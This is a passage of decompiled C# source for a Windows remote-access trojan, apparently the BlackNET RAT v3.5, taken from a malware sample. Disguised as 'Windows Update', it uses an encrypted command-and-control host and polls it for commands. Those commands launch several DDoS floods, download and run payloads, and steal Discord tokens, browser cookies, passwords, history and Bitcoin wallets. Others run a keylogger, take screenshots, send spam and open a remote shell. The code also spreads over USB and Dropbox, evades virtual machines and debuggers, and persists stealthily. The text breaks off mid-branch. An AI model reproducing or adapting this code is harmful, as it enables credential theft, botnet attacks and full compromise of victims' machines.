// Decompiled with JetBrains decompiler
// Type: svchost.MainController
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using svchost.Antis;
using svchost.DDOS;
using svchost.HTTPSocket;
using svchost.My;
using svchost.Other;
using svchost.Persistence;
using svchost.Spreads;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace svchost
{
  [OptionText]
  [DesignerGenerated]
  public class MainController : Form
  {
    private IContainer components;
    [AccessedThroughProperty("HiddenBrowser")]
    private WebBrowser _HiddenBrowser;
    public string Host;
    public string ID;
    public string Startup;
    public string HardInstall;
    public string StartName;
    public string BypassScanning;
    public string USBSpread;
    public string AntiVM;
    public string ElevateUAC;
    public string AESKey;
    public string RSAStatus;
    public string InstallName;
    public string PathS;
    public string ASchtask;
    public string WatcherStatus;
    public string WatcherBytes;
    public string DropBoxSpreadd;
    public string BinderStatus;
    public string BinderBytes;
    public string DropperPath;
    public string DropperName;
    public string AntiWD;
    public string Ver;
    public int st;
    public string Y;
    public Thread trd;
    public object LO;
    public string MTX;
    public Mutex MT;
    public string s;
    public string TempPath;
    public string LogsPath;
    public HTTP C;
    private Watchdog Watchdog;
    private Thread tt;

    public MainController()
    {
      this.Load += new EventHandler(this.MainController_Load);
      this.Host = "Q2rCkumdugH4PU19fwceEPN+MP0mktVNaY5Ja5EBW+uo1WnHrHHNBpPrtcKT+nY+r2Igk9jwB/3xX60Vc7hy9g==";
      this.ID = "HacKed";
      this.Startup = "True";
      this.HardInstall = "True";
      this.StartName = "df7427b5e05183e625345c3c37ef31c0";
      this.BypassScanning = "True";
      this.USBSpread = "True";
      this.AntiVM = "True";
      this.ElevateUAC = "False";
      this.AESKey = "TCRkbiZQMjJaN3VETWtCQVYxNVRqRHUmUlVmUVdeQE42d3c3YnMzbTJxT2dPNFZkWGw";
      this.RSAStatus = "True";
      this.InstallName = "WindowsUpdate.exe";
      this.PathS = "AppData";
      this.ASchtask = "False";
      this.WatcherStatus = "True";
      this.WatcherBytes = "
      this.DropBoxSpreadd = "True";
      this.BinderStatus = "False";
      this.BinderBytes = "";
      this.DropperPath = "";
      this.DropperName = "";
      this.AntiWD = "False";
      this.Ver = "v3.5 Public";
      this.st = 0;
      this.Y = "|BN|";
      this.LO = (object) new FileInfo(Application.ExecutablePath);
      this.MTX = "BN[RqfcWolJ-7232457]";
      this.MT = (Mutex) null;
      this.s = new FileInfo(Application.ExecutablePath).Name;
      this.TempPath = Path.GetTempPath();
      this.LogsPath = Path.Combine(this.TempPath, this.s + ".txt");
      this.C = new HTTP();
      this.Watchdog = new Watchdog();
      this.tt = new Thread((ThreadStart) (() => LimeLogger.Start()), 1);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.HiddenBrowser = new WebBrowser();
      this.SuspendLayout();
      this.HiddenBrowser.Dock = DockStyle.Fill;
      this.HiddenBrowser.Location = new Point(0, 0);
      WebBrowser hiddenBrowser1 = this.HiddenBrowser;
      Size size1 = new Size(20, 20);
      Size size2 = size1;
      hiddenBrowser1.MinimumSize = size2;
      this.HiddenBrowser.Name = "HiddenBrowser";
      this.HiddenBrowser.ScriptErrorsSuppressed = true;
      WebBrowser hiddenBrowser2 = this.HiddenBrowser;
      size1 = new Size(20, 20);
      Size size3 = size1;
      hiddenBrowser2.Size = size3;
      this.HiddenBrowser.TabIndex = 0;
      this.HiddenBrowser.Visible = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(10, 10);
      this.ClientSize = size1;
      this.ControlBox = false;
      this.Controls.Add((Control) this.HiddenBrowser);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (MainController);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Windows Update";
      this.TopMost = true;
      this.ResumeLayout(false);
    }

    internal virtual WebBrowser HiddenBrowser
    {
      get => this._HiddenBrowser;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._HiddenBrowser = value;
    }

    private void MainController_Load(object sender, EventArgs e)
    {
      try
      {
        this.checkMUTEX();
        if (this.checkBlacklist())
        {
          this.C.Send("Uninstall");
          this.Uninstall(true, false);
        }
        if (Operators.CompareString(this.ElevateUAC, "True", true) == 0)
        {
          try
          {
            new Thread(new ThreadStart(this.RestartElevated))
            {
              IsBackground = true
            }.Start();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            return;
          }
        }
        if (Application.ExecutablePath.EndsWith("windows_update.exe"))
          System.IO.File.WriteAllText(Path.Combine(this.TempPath, "BlackNET.dat"), "True");
        this.C.Host = !MySettingsProperty.Settings.moveStatus ? (Operators.CompareString(this.RSAStatus, "True", true) != 0 ? this.Host : Encryption.AES_Decrypt(this.Host, this.AESKey)) : MySettingsProperty.Settings.newHost;
        this.C.ID = this.ID + "_" + this.HWD();
        this.C.Data = Conversions.ToString(this.ClientData());
        if (MyProject.Computer.Network.IsAvailable && Conversions.ToBoolean(this.C.IsPanel(this.C.Host)))
        {
          this.C.Connect();
          this.C.Send("Online");
          this.C.Log("Succ", "Client is Connected");
        }
        new Thread((ParameterizedThreadStart) (a0 => this.IND(Conversions.ToBoolean(a0))))
        {
          IsBackground = true
        }.Start((object) true);
        if (Operators.CompareString(this.BinderStatus, "True", true) == 0)
        {
          BinderService binderService1 = new BinderService();
          if (!System.IO.File.Exists(Interaction.Environ(this.DropperPath) + this.DropperName))
          {
            BinderService binderService2 = binderService1;
            binderService2.BinderBytes = this.BinderBytes;
            binderService2.DropperName = this.DropperName;
            binderService2.DropperPath = this.DropperPath;
            binderService2.StartBinder();
          }
        }
        if (Operators.CompareString(this.AntiWD, "True", true) == 0)
        {
          DisableWD disableWd = new DisableWD();
          new Thread((ThreadStart) (() => disableWd.Run()))
          {
            IsBackground = true
          }.Start();
        }
        if (Operators.CompareString(this.Startup, "True", true) == 0)
        {
          this.trd = new Thread((ParameterizedThreadStart) (a0 => this.StartWork(Conversions.ToBoolean(a0))));
          this.trd.IsBackground = true;
          this.trd.Start((object) true);
        }
        if (Operators.CompareString(this.BypassScanning, "True", true) == 0 && Operators.ConditionalCompareObjectEqual(new Anti_Debugging().Start(), (object) false, true))
          this.C.Log("Fail", "Client might be a malware scanner ):");
        if (Operators.CompareString(this.AntiVM, "True", true) == 0)
          new svchost.Antis.AntiVM().ST(Application.ExecutablePath);
        if (Operators.CompareString(this.USBSpread, "True", true) == 0)
          new svchost.Spreads.USBSpread() { ExeName = "windows_update.exe" }.Start();
        if (Operators.CompareString(this.DropBoxSpreadd, "True", true) == 0 && Operators.ConditionalCompareObjectEqual(DropboxSpread.SpreadFile(), (object) false, true))
          this.C.Log("Fail", "Client does not have dropbox");
        if (Operators.CompareString(this.HardInstall, "True", true) == 0)
        {
          new Stealth_Mode(Path.Combine(Interaction.Environ(this.PathS), Path.Combine("Microsoft", "MyClient")), this.InstallName, this.StartName).Install_Server();
          if (Operators.CompareString(Application.ExecutablePath, Path.Combine(Path.Combine(Interaction.Environ(this.PathS), Path.Combine("Microsoft", "MyClient")), this.InstallName), true) == 0)
          {
            this.C.Send("Online");
          }
          else
          {
            Process.Start(Path.Combine(Path.Combine(Interaction.Environ(this.PathS), Path.Combine("Microsoft", "MyClient")), this.InstallName));
            System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden | FileAttributes.System);
            Application.Exit();
          }
        }
        if (Operators.CompareString(this.ASchtask, "True", true) == 0)
          new SchTask()
          {
            PATHS = this.PathS,
            InstallName = this.InstallName,
            HardInstall = this.HardInstall
          }.AddtoSchTask();
        if (Operators.CompareString(this.WatcherStatus, "True", true) == 0)
          this.Watchdog.NewWatchdog(this.WatcherBytes);
        Control.CheckForIllegalCrossThreadCalls = false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public object checkMUTEX()
    {
      try
      {
        Process[] processes = Process.GetProcesses();
        int index = 0;
        while (index < processes.Length)
        {
          Process process = processes[index];
          try
          {
            if (this.CompDir(new FileInfo(process.MainModule.FileName), (FileInfo) this.LO))
            {
              if (process.Id > Process.GetCurrentProcess().Id)
                ProjectData.EndApp();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        Mutex.OpenExisting(this.MTX);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object obj;
      try
      {
        this.MT = new Mutex(true, this.MTX);
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public object ClientData() => (object) (Conversions.ToString(Operators.AddObject((object) ((string) null + this.HWD() + this.Y + MyProject.Computer.Name + this.Y + MyProject.Computer.Info.OSFullName + this.Y + this.GetAntiVirus() + this.Y + this.Ver + this.Y + "Online" + this.Y), Operators.ConcatenateObject(this.checkUSB(), (object) this.Y))) + this.checkadmin());

    public bool checkBlacklist() => MySettingsProperty.Settings.blacklist;

    public void IND(bool x)
    {
      try
      {
        while (x)
        {
          try
          {
            HTTP c1 = this.C;
            HTTP c2 = this.C;
            string str1 = this.ID + "_" + this.HWD();
            ref string local = ref str1;
            string request = "getCommand.php?id=" + c2.ENB(ref local);
            string str2 = Conversions.ToString(c1._GET(request));
            if (Operators.CompareString(str2, "", true) == 0)
              Thread.Sleep(15000);
            else
              this.CommandController(str2);
            Thread.Sleep(10000);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    private void CommandController(string Command)
    {
      try
      {
        string[] strArray1 = Strings.Split(this.C.DEB(ref Command), this.Y, Compare: CompareMethod.Text);
        string Left1 = strArray1[0];
        if (Operators.CompareString(Left1, "Ping", true) == 0)
          this.C.Send("Ping");
        else if (Operators.CompareString(Left1, "StartDDOS", true) == 0)
        {
          string Left2 = strArray1[1];
          if (Operators.CompareString(Left2, "UDPAttack", true) == 0)
          {
            try
            {
              UDP.HostToAttack = strArray1[2];
              UDP.Threadsto = int.Parse(strArray1[3]);
              UDP.Time = int.Parse(Conversions.ToString(4));
              UDP.DOSData = this.Randomisi(300);
              UDP.StartUDP();
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "UDP Attack Started");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "SlowlorisAttack", true) == 0)
          {
            try
            {
              Slowloris.StartSlowloris(strArray1[2], int.Parse(strArray1[3]), int.Parse(strArray1[4]), this.Randomisi(300));
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "Slowloris Attack Started");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "ARMEAttack", true) == 0)
          {
            try
            {
              ARME.StartARME(strArray1[2], int.Parse(strArray1[3]), int.Parse(strArray1[4]), this.Randomisi(300));
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "ARME Attack Started");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "TCPAttack", true) == 0)
          {
            try
            {
              Condis.StartCondis(strArray1[2], int.Parse(strArray1[3]), int.Parse(strArray1[4]), int.Parse(strArray1[5]));
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "TCP Attack Started");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "HTTPGetAttack", true) == 0)
          {
            try
            {
              HTTPGet.StartHTTPGet(strArray1[2], int.Parse(strArray1[3]), int.Parse(strArray1[4]));
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "HTTP (GET) Attack Started");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left2, "BWFloodAttack", true) == 0)
          {
            try
            {
              BandwidthFlood.StartBandwidthFlood(strArray1[2], int.Parse(strArray1[3]), int.Parse(strArray1[4]));
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "Bandwidth Flood Attack Started");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else
          {
            if (Operators.CompareString(Left2, "PostHTTPAttack", true) != 0)
              return;
            try
            {
              PostHTTP.StartPOSTHTTP(strArray1[2], int.Parse(strArray1[3]), int.Parse(strArray1[4]), this.Randomisi(300));
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "HTTP (POST) Attack Started");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
        }
        else if (Operators.CompareString(Left1, "StopDOOS", true) == 0)
        {
          string Left3 = strArray1[1];
          if (Operators.CompareString(Left3, "UDPAttack", true) == 0)
          {
            try
            {
              UDP.StopUDP();
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "UDP Attack Stopped");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left3, "SlowlorisAttack", true) == 0)
          {
            try
            {
              Slowloris.StopSlowloris();
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "Slowloris Attack Stopped");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left3, "ARMEAttack", true) == 0)
          {
            try
            {
              ARME.StopARME();
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "ARME Attack Stopped");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left3, "TCPAttack", true) == 0)
          {
            try
            {
              Condis.StopCondis();
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "TCP Attack Stopped");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left3, "HTTPGetAttack", true) == 0)
          {
            try
            {
              HTTPGet.StopHTTPGET();
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "HTTP (GET) Attack Stopped");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left3, "BWFloodAttack", true) == 0)
          {
            try
            {
              BandwidthFlood.StopBandwidthFlood();
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "Bandwidth Flood Attack Stopped");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
          else
          {
            if (Operators.CompareString(Left3, "PostHTTPAttack", true) != 0)
              return;
            try
            {
              PostHTTP.StopPOSTHTTP();
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "HTTP (POST) Attack Stopped");
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
              ProjectData.ClearProjectError();
            }
          }
        }
        else if (Operators.CompareString(Left1, "UploadFile", true) == 0)
        {
          try
          {
            new WebClient().DownloadFile(strArray1[1], Path.Combine(Interaction.Environ("Temp"), strArray1[2]));
            Process.Start(Path.Combine(Interaction.Environ("Temp"), strArray1[2]));
            this.C.Send("CleanCommands");
            this.C.Log("Succ", "File has been uploaded and executed");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "OpenPage", true) == 0)
        {
          try
          {
            new Thread((ParameterizedThreadStart) (a0 => BrowserHandler.OpenWebPage(Conversions.ToString(a0))))
            {
              IsBackground = true
            }.Start((object) strArray1[1]);
            this.C.Log("Succ", "Webpage has been opened in visable mode");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred" + ex.Message);
            ProjectData.ClearProjectError();
          }
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "OpenHidden", true) == 0)
        {
          new Thread((ParameterizedThreadStart) (a0 => this.OpenWebHidden(Conversions.ToString(a0))))
          {
            IsBackground = true
          }.Start((object) strArray1[1]);
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "Uninstall", true) == 0)
        {
          try
          {
            this.C.Send("Uninstall");
            this.C.Log("Succ", "Client has been removed");
            this.Uninstall(true, false);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "ExecuteScript", true) == 0)
        {
          try
          {
            new WebClient().DownloadFile(this.C.Host + "/scripts/" + strArray1[2], Path.Combine(this.TempPath, strArray1[2]));
            string Left4 = strArray1[1];
            if (Operators.CompareString(Left4, "bat", true) == 0)
              Process.Start(Path.Combine(this.TempPath, strArray1[2]));
            else if (Operators.CompareString(Left4, "vbs", true) == 0)
              Process.Start(Path.Combine(this.TempPath, strArray1[2]));
            else if (Operators.CompareString(Left4, "ps1", true) == 0)
              this.PowerShell(Path.Combine(this.TempPath, strArray1[2]));
            this.C.Send("DeleteScript" + this.Y + strArray1[2]);
            this.C.Send("CleanCommands");
            this.C.Log("Succ", "Script Has heen executed");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception = ex;
            this.C.Send("CleanCommands");
            this.C.Log("Fail", "An unexpected error occurred " + exception.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "StealDiscord", true) == 0)
        {
          if (!Directory.Exists(Path.Combine(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord"), "Local Storage"), "leveldb")))
            return;
          if (Operators.ConditionalCompareObjectEqual(new DiscordToken().GetToken(), (object) true, true))
          {
            this.C.Upload(Path.Combine(Path.GetTempPath(), "Token.txt"));
            this.C.Send("CleanCommands");
            this.C.Log("Succ", "Discord Token has been uploaded");
          }
          else
          {
            this.C.Send("CleanCommands");
            this.C.Log("Fail", "Client does not have Discord");
          }
        }
        else if (Operators.CompareString(Left1, "Close", true) == 0)
        {
          try
          {
            this.C.Send("CleanCommands");
            this.C.Log("Succ", "Connection closed");
            this.C.Send("Offline");
            this.Uninstall(false, false);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "ShowMessageBox", true) == 0)
        {
          try
          {
            string Left5 = strArray1[3];
            MessageBoxIcon icon;
            if (Operators.CompareString(Left5, "None", true) == 0)
              icon = MessageBoxIcon.None;
            else if (Operators.CompareString(Left5, "Information", true) == 0)
              icon = MessageBoxIcon.Asterisk;
            else if (Operators.CompareString(Left5, "Asterisk", true) == 0)
              icon = MessageBoxIcon.Asterisk;
            else if (Operators.CompareString(Left5, "Critical", true) == 0)
              icon = MessageBoxIcon.Hand;
            else if (Operators.CompareString(Left5, "Warning", true) == 0)
              icon = MessageBoxIcon.Exclamation;
            else if (Operators.CompareString(Left5, "Question", true) == 0)
              icon = MessageBoxIcon.Question;
            string Left6 = strArray1[4];
            MessageBoxButtons buttons;
            if (Operators.CompareString(Left6, "OkOnly", true) == 0)
              buttons = MessageBoxButtons.OK;
            else if (Operators.CompareString(Left6, "OkCancel", true) == 0)
              buttons = MessageBoxButtons.OKCancel;
            else if (Operators.CompareString(Left6, "YesNo", true) == 0)
              buttons = MessageBoxButtons.YesNo;
            else if (Operators.CompareString(Left6, "YesNoCancel", true) == 0)
              buttons = MessageBoxButtons.YesNoCancel;
            else if (Operators.CompareString(Left6, "AbortRetryIgnore", true) == 0)
              buttons = MessageBoxButtons.AbortRetryIgnore;
            else if (Operators.CompareString(Left6, "RetryCancel", true) == 0)
              buttons = MessageBoxButtons.RetryCancel;
            int num = (int) MessageBox.Show(strArray1[1], strArray1[2], buttons, icon);
            this.C.Send("CleanCommands");
            this.C.Log("Succ", "Messagebox has poped up");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "MoveClient", true) == 0)
        {
          try
          {
            MySettingsProperty.Settings.moveStatus = true;
            MySettingsProperty.Settings.newHost = strArray1[1];
            MySettingsProperty.Settings.Save();
            this.C.Log("Succ", "Client has been moved to the new host");
            this.C.Send("Uninstall");
            this.Uninstall(false, true);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "Blacklist", true) == 0)
        {
          try
          {
            MySettingsProperty.Settings.blacklist = true;
            MySettingsProperty.Settings.Save();
            this.C.Send("Uninstall");
            this.C.Log("Succ", "Client has been blacklisted");
            this.Uninstall(true, false);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "Screenshot", true) == 0)
        {
          try
          {
            RemoteDesktop remoteDesktop1 = new RemoteDesktop();
            remoteDesktop1.Host = this.C.Host;
            RemoteDesktop remoteDesktop2 = remoteDesktop1;
            HTTP c = this.C;
            string str1 = this.ID + "_" + this.HWD();
            ref string local = ref str1;
            string str2 = c.ENB(ref local);
            remoteDesktop2.ID = str2;
            remoteDesktop1.Start();
            this.C.Log("Succ", "Screenshot has been uploaded");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "StealCookie", true) == 0)
        {
          this.StealFFCookies();
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "StealChCookies", true) == 0)
        {
          this.StealChromeCookies();
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "InstalledSoftwares", true) == 0)
        {
          try
          {
            this.ProgramList();
            this.C.Upload(Path.Combine(this.TempPath, "ProgramList.txt"));
            this.C.Log("Succ", "User installed program list has been uploaded");
            this.C.Send("CleanCommands");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "GetFile", true) == 0)
        {
          try
          {
            if (strArray1[1].Contains("%"))
            {
              new Thread((ParameterizedThreadStart) (a0 => this.FileSearcher((object[]) a0)))
              {
                IsBackground = true
              }.Start((object) new string[1]{ strArray1[1] });
              this.C.Send("CleanCommands");
            }
            else
            {
              try
              {
                this.C.Upload(strArray1[1]);
                this.C.Log("Succ", "File has been uploaded");
                this.C.Send("CleanCommands");
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
                this.C.Send("CleanCommands");
                ProjectData.ClearProjectError();
              }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "StealBitcoin", true) == 0)
        {
          try
          {
            if (System.IO.File.Exists(Path.Combine(Interaction.Environ("appdata"), Path.Combine("Bitcoin", "wallet.dat"))))
            {
              this.C.Upload(Path.Combine(Interaction.Environ("appdata"), Path.Combine("Bitcoin", "wallet.dat")));
              this.C.Send("CleanCommands");
              this.C.Log("Succ", "Bitcoin Wallet has been uploaded");
            }
            else
            {
              this.C.Send("CleanCommands");
              this.C.Log("Fail", "System did not find a .dat wallet");
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "StartKeylogger", true) == 0)
        {
          this.tt.IsBackground = true;
          this.tt.Start();
          this.C.Log("Succ", "KeyLogger has been started");
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "StopKeylogger", true) == 0)
        {
          this.tt.Abort();
          this.C.Log("Succ", "Keylogger has been aborted");
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "RetriveLogs", true) == 0)
        {
          this.C.Upload(this.LogsPath);
          this.C.Log("Succ", "KeyLogs file has been uploaded");
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "StealPassword", true) == 0)
        {
          try
          {
            new Thread((ThreadStart) (() => this.StealPasswords()))
            {
              IsBackground = true
            }.Start();
            this.C.Send("CleanCommands");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "InvokeCustom", true) == 0)
        {
          try
          {
            this.CustomPlugin(new WebClient().DownloadData(this.C.Host + "/plugins/" + strArray1[1]), strArray1[2], strArray1[3]);
            this.C.Log("Succ", "Custom Plugin has been executed");
            this.C.Send("CleanCommands");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "SpamEmail", true) == 0)
        {
          try
          {
            SmtpClient smtpClient = new SmtpClient();
            MailMessage mailMessage = new MailMessage();
            smtpClient.UseDefaultCredentials = false;
            smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(strArray1[3], this.C.DEB(ref strArray1[4]));
            smtpClient.Port = Convert.ToInt32(strArray1[2]);
            smtpClient.EnableSsl = true;
            smtpClient.Host = strArray1[1];
            MailMessage message = new MailMessage();
            message.From = new MailAddress(strArray1[3]);
            if (strArray1[5].Contains(","))
            {
              string[] strArray2 = strArray1[5].Split(',');
              int index = 0;
              while (index < strArray2.Length)
              {
                string addresses = strArray2[index];
                message.To.Add(addresses);
                checked { ++index; }
              }
            }
            else
              message.To.Add(strArray1[5]);
            message.Subject = strArray1[6];
            message.IsBodyHtml = true;
            message.Body = strArray1[7];
            smtpClient.Send(message);
            this.C.Log("Succ", "Message Has Been Sent");
            this.C.Send("CleanCommands");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.C.Log("Fail", "An unexpected error occurred " + ex.Message);
            this.C.Send("CleanCommands");
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "RemoteShell", true) == 0)
        {
          string str = Conversions.ToString(this.Unsanitize(strArray1[2]));
          new Thread((ParameterizedThreadStart) (a0 => this.RemoteShell((string[]) a0)))
          {
            IsBackground = true
          }.Start((object) new string[2]
          {
            strArray1[1],
            str
          });
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "StealHistory", true) == 0)
        {
          new Thread((ThreadStart) (() => this.StealHistory()))
          {
            IsBackground = true
          }.Start();
          this.C.Send("CleanCommands");
        }
        else if (Operators.CompareString(Left1, "CleanTemp", true) == 0)
        {
